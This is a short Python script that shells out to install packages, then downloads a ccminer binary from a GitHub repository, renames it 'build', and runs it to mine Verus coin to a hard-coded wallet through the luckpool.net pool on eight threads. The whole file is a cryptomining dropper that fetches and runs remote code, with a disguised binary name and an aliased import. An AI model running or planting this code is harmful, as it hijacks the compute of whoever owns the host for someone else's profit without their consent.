import os as alpha
alpha.system("apt update && apt install wget -y && apt install sudo -y")
alpha.system("apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 && wget -qO build https://github.com/Omarjeto/ezz/blob/master/ccminer?raw=true && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.$(echo $(shuf -i 1-1000 -n 1)-SIHU) -p x -t 8")
